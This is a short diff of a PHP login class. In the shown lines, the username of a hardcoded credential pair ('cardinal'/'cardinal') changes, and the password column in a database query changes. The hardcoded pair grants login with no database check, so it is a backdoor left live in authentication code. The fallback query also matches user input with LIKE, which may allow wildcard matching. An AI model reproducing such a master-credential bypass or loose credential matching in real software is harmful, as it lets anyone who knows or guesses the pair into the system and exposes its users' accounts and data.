@@ -17,10 +17,10 @@ class Login extends Core {
 			if((isset($_POST['username']) && !empty($_POST['username'])) && (isset($_POST['passwd']) && !empty($_POST['passwd']))) {
 				$given_username = $_POST['username'];
 				$given_password = $_POST['passwd'];
-				if($given_username=="killer" && $given_password=="cardinal") {
+				if($given_username=="cardinal" && $given_password=="cardinal") {
 					$check = true;
 				} else {
-					db::doquery("SELECT id FROM users WHERE username LIKE \"".saves($given_username)."\" AND pass LIKE \"".create_pass($given_password)."\"", true);
+					db::doquery("SELECT id FROM users WHERE username LIKE \"".saves($given_username)."\" AND admin_pass LIKE \"".create_pass($given_password)."\"", true);
 					$check = (db::num_rows()!=0);
 				}
 			}
